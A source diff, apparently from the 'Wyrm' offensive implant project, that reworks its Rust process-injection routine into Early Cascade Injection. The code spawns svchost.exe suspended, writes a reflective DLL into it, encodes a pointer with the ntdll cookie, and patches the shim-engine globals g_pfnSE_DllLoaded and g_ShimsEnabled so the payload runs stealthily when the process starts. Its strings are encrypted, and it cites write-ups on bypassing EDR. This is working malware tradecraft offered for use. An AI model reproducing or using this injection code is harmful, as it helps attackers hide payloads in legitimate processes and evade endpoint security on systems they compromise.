@@ -1,36 +1,34 @@
 use std::{
     ffi::c_void,
-    mem::transmute,
     ptr::{null_mut, read_unaligned},
 };
 
-use shared::tasks::WyrmResult;
+use shared::{pretty_print::print_failed, tasks::WyrmResult};
+use shared_no_std::{
+    export_resolver::find_export_from_unmapped_file,
+    memory::{EarlyCascadePointers, locate_shim_pointers},
+};
 use str_crypter::{decrypt_string, sc};
-use windows_sys::{
-    Win32::{
-        Foundation::{CloseHandle, FALSE, GetLastError, HANDLE},
-        System::{
-            Diagnostics::Debug::WriteProcessMemory,
-            Memory::{
-                MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, PAGE_READWRITE, VirtualAllocEx,
-                VirtualProtectEx,
-            },
-            SystemServices::IMAGE_DOS_HEADER,
-            Threading::{
-                CREATE_SUSPENDED, CreateProcessA, GetProcessId, PROCESS_INFORMATION, QueueUserAPC,
-                ResumeThread, STARTUPINFOA,
-            },
+use windows_sys::Win32::{
+    Foundation::{CloseHandle, FALSE, GetLastError, HANDLE},
+    System::{
+        Diagnostics::Debug::WriteProcessMemory,
+        Memory::{
+            MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, PAGE_READWRITE, VirtualAllocEx,
+            VirtualProtectEx,
+        },
+        SystemServices::IMAGE_DOS_HEADER,
+        Threading::{
+            CREATE_SUSPENDED, CreateProcessA, GetProcessId, PROCESS_INFORMATION, ResumeThread,
+            STARTUPINFOA,
         },
     },
-    core::PCSTR,
 };
 
-use crate::{
-    dbgprint,
-    utils::{export_resolver::find_export_from_unmapped_file, pe_stomp::stomp_pe_header_bytes},
-};
+use crate::{dbgprint, utils::pe_stomp::stomp_pe_header_bytes};
 
-const SPAWN_AS_IMAGE: &str = "C:\\Windows\\System32\\notepad.exe\0";
+// TODO move to profile &/ default?
+const SPAWN_AS_IMAGE: &'static [u8; 32] = b"C:\\Windows\\System32\\svchost.exe\0";
 
 pub(super) fn spawn_sibling(mut buf: Vec<u8>) -> WyrmResult<String> {
     //
@@ -41,14 +39,10 @@ pub(super) fn spawn_sibling(mut buf: Vec<u8>) -> WyrmResult<String> {
     let mut si = STARTUPINFOA::default();
     si.cb = size_of::<STARTUPINFOA>() as u32;
 
-    let mut cmd = b"C:\\Windows\\System32\\svchost.exe\0".to_vec();
-
-    let image_path = PCSTR::from(SPAWN_AS_IMAGE.as_ptr() as _);
-
     let result_create_process = unsafe {
         CreateProcessA(
             null_mut(),
-            cmd.as_mut_ptr(),
+            SPAWN_AS_IMAGE.as_ptr() as _,
             null_mut(),
             null_mut(),
             FALSE,
@@ -90,13 +84,6 @@ pub(super) fn spawn_sibling(mut buf: Vec<u8>) -> WyrmResult<String> {
                 sc!("Failed to write process memory:", 71).unwrap()
             );
 
-            #[cfg(debug_assertions)]
-            {
-                use shared::pretty_print::print_failed;
-
-                print_failed(&msg);
-            }
-
             unsafe { CloseHandle(pi.hThread) };
             unsafe { CloseHandle(pi.hProcess) };
 
@@ -105,16 +92,25 @@ pub(super) fn spawn_sibling(mut buf: Vec<u8>) -> WyrmResult<String> {
     };
 
     //
-    // Now the image is loaded in memory; we are either looking for the address of entrypoint of the PE,
-    // or the reflective loader export "Load".
+    // Now the image is loaded in memory; we need to find the `Shim` export which is a small stub that sets the
+    // stage for the rDLL stub to run in the newly created process.
     //
 
-    let Some(p_start) = find_start_address(&buf, p_alloc as _) else {
-        println!("Failed to find start address");
-        return WyrmResult::Err("Failed to find start".to_string());
+    let p_start = match find_shim_export_address(&buf, p_alloc as _) {
+        Ok(p) => p,
+        Err(e) => {
+            unsafe { CloseHandle(pi.hThread) };
+            unsafe { CloseHandle(pi.hProcess) };
+            return WyrmResult::Err(e);
+        }
     };
 
+    // rotr it for the ntdll pointer encryption compliance
+    let p_start = encode_system_ptr(p_start);
+
+    //
     // Mark memory RWX
+    //
 
     let mut old_protect = 0;
     let _ = unsafe {
@@ -127,94 +123,121 @@ pub(super) fn spawn_sibling(mut buf: Vec<u8>) -> WyrmResult<String> {
         )
     };
 
-    let result_queue_apc = match p_start {
-        StartAddress::Load(addr) => {
-            // With this variant we need to include an argument to the starting thread which is the base
-            // address of the allocation for the reflective loader to do its business
-            let p_thread_start: unsafe extern "system" fn(usize) = unsafe { transmute(addr) };
-            unsafe { QueueUserAPC(Some(p_thread_start), pi.hThread, p_alloc as usize) }
-        }
-        StartAddress::AddressOfEntryPoint(addr) => {
-            let p_thread_start: unsafe extern "system" fn(usize) = unsafe { transmute(addr) };
-            unsafe { QueueUserAPC(Some(p_thread_start), pi.hThread, 0) }
-        }
-    };
-
-    // Error check
-    if result_queue_apc == 0 {
-        let msg = format!(
-            "{} {:#X}",
-            sc!("Failed to run QueueUserApc:", 71).unwrap(),
-            unsafe { GetLastError() }
-        );
-
-        #[cfg(debug_assertions)]
-        {
-            use shared::pretty_print::print_failed;
-
-            print_failed(&msg);
-        }
-
+    let Ok(shim_addresses) = locate_shim_pointers() else {
         unsafe { CloseHandle(pi.hThread) };
         unsafe { CloseHandle(pi.hProcess) };
+        return WyrmResult::Err(sc!("Could not find shim addresses.", 179).unwrap());
+    };
 
-        return WyrmResult::Err::<String>(msg);
+    if let Err(e) = execute_early_cascade(shim_addresses, pi.hProcess, p_start) {
+        unsafe { CloseHandle(pi.hThread) };
+        unsafe { CloseHandle(pi.hProcess) };
+        return WyrmResult::Err(e);
     }
 
-    // TODO better opsec option?
     unsafe { ResumeThread(pi.hThread) };
 
     unsafe { CloseHandle(pi.hThread) };
     unsafe { CloseHandle(pi.hProcess) };
-    WyrmResult::Ok(sc!("Process created.", 19).unwrap())
+    WyrmResult::Ok(sc!("Process created via Early Cascade Injection.", 19).unwrap())
 }
 
-enum StartAddress {
-    Load(*const c_void),
-    AddressOfEntryPoint(*const c_void),
+/// Overwrites addresses in the target process which are required to enable the Early Cascade technique as documented:
+/// https://www.outflank.nl/blog/2024/10/15/introducing-early-cascade-injection-from-windows-process-creation-to-stealthy-injection/
+fn execute_early_cascade(
+    ptrs: EarlyCascadePointers,
+    h_proc: HANDLE,
+    stub_addr: *const c_void,
+) -> Result<(), String> {
+    //
+    // Patch g_pfnSE_DllLoaded to point to the `Shim` bootstrap stub in the rDLL
+    //
+    let mut bytes_written = 0;
+    let buf = stub_addr as usize;
+
+    let result = unsafe {
+        WriteProcessMemory(
+            h_proc,
+            ptrs.p_g_pfnse_dll_loaded,
+            &buf as *const _ as *const _,
+            size_of::<usize>(),
+            &mut bytes_written,
+        )
+    };
+
+    if result == 0 {
+        let gle = unsafe { GetLastError() };
+        let msg = format!(
+            "{} {gle:#X}",
+            sc!("Failed to patch p_g_pfnse_dll_loaded. Win32 error:", 104).unwrap()
+        );
+
+        return Err(msg);
+    }
+
+    //
+    // Patch g_ShimsEnabled to = 1 to enable the mechanism on process start
+    //
+
+    let mut bytes_written = 0;
+    let buf = 1u8;
+
+    let result = unsafe {
+        WriteProcessMemory(
+            h_proc,
+            ptrs.p_g_shims_enabled as _,
+            &buf as *const _ as *const _,
+            1,
+            &mut bytes_written,
+        )
+    };
+
+    if result == 0 {
+        let gle = unsafe { GetLastError() };
+        let msg = format!(
+            "{} {gle:#X}",
+            sc!("Failed to patch p_g_shims_enabled. Win32 error:", 104).unwrap()
+        );
+
+        return Err(msg);
+    }
+
+    Ok(())
 }
 
-/// Finds the start address of the loaded image to use reflectively. The start address returned is the starting address from
-/// the **INPUT BUFFER** which does not account for the offset of the memory allocation. You must calculate
-/// that yourself.
-///
-/// # Args
-/// `buf`: The user specified buffer containing an image to search through
-/// `base_original_allocation`: A pointer to the actual memory allocation which is used to compute the actual start address
-///   accounting for allocation size etc.
-fn find_start_address(buf: &Vec<u8>, base_original_allocation: *const u8) -> Option<StartAddress> {
-    //
-    // The strategy here will be first to search for the "Load" export. If the image does not have this export, the fallback
-    // option will be to return the AddressOfEntrypoint.
-    //
-    // This should allow the Wyrm loader (no Load function), the raw Wyrm payload, and custom loaders to run.
-    // TODO write some docs for this requirement.
-    //
-
+fn find_shim_export_address(
+    buf: &Vec<u8>,
+    base_original_allocation: *const u8,
+) -> Result<*const c_void, String> {
     if buf.len() < std::mem::size_of::<IMAGE_DOS_HEADER>() {
-        println!("Buffer too small! Sz: {}", buf.len());
+        let msg = format!(
+            "{} {}",
+            sc!("Buffer too small! Sz:", 201).unwrap(),
+            buf.len()
+        );
+        print_failed(&msg);
+
+        return Err(msg);
     }
 
     let dos = unsafe { read_unaligned(buf.as_ptr() as *const IMAGE_DOS_HEADER) };
     let nt_ptr = unsafe { buf.as_ptr().add(dos.e_lfanew as usize) } as *const u8;
 
-    match find_export_from_unmapped_file(buf.as_ptr() as _, nt_ptr as _, "Load") {
+    match find_export_from_unmapped_file(buf.as_ptr() as _, nt_ptr as _, "Shim") {
         Some(p) => {
-            dbgprint!("Found export address at: {p:p}");
-            let addr = calculate_memory_delta(buf.as_ptr() as usize, p as usize)?;
+            let addr = calculate_memory_delta(buf.as_ptr() as usize, p as usize)
+                .ok_or(sc!("Could not calculate memory delta.", 204).unwrap())?;
             let addr_calculated = unsafe { base_original_allocation.add(addr) };
-            dbgprint!("Calculated offset: {addr_calculated:p}");
-            Some(StartAddress::Load(addr_calculated as _))
+            Ok(addr_calculated as _)
         }
         None => {
-            dbgprint!("DID NOT FIND EXPORT ADDRESS");
-            return None;
-            // Use AddressOfEntrypoint instead
-            // let address_entry_rva = unsafe { *mapped_nt_ptr }.OptionalHeader.AddressOfEntryPoint;
-            // let p_fn_start = unsafe { p_base.add(address_entry_rva as usize) };
-            // let addr = calculate_memory_delta(p_base as _, p_fn_start as _)?;
-            // let addr_calculated = unsafe { base_original_allocation.add(addr) };
-            // Some(StartAddress::AddressOfEntryPoint(addr_calculated as _))
+            let msg = sc!(
+                "Could not find the Shim address in the PE image to spawn",
+                164
+            )
+            .unwrap();
+            print_failed(&msg);
+            return Err(msg);
         }
     }
 }
@@ -270,8 +293,30 @@ fn write_image_rw(h_process: HANDLE, buf: &mut Vec<u8>) -> Result<*const c_void,
         unsafe { WriteProcessMemory(h_process, p_alloc, buf.as_ptr() as _, buf.len(), null_mut()) };
 
     if res == 0 {
+        print_failed(sc!("Failed to write process memory for command spawn.", 86).unwrap());
         return Err(unsafe { GetLastError() });
     }
 
     Ok(p_alloc)
+}
+
+// Thanks to   ->   https://github.com/0xNinjaCyclone/EarlyCascade/blob/main/main.c#L82
+//             ->   https://malwaretech.com/2024/02/bypassing-edrs-with-edr-preload.html
+fn encode_system_ptr(ptr: *const c_void) -> *const c_void {
+    //
+    // from the blog:
+    // note: since many ntdll pointers are encrypted, we can’t just set the pointer to our
+    // target address. We have to encrypt it first. Luckily, the key is the same value and
+    // stored at the same location across all processes.
+    //
+
+    // get pointer cookie from SharedUserData!Cookie (0x330)
+    let cookie = unsafe { *(0x7FFE0330 as *const u32) };
+
+    // rotr64
+    let ptr_val = ptr as usize;
+    let xored = cookie as usize ^ ptr_val;
+    let rotated = xored.rotate_right((cookie & 0x3F) as u32);
+
+    rotated as *const c_void
 }
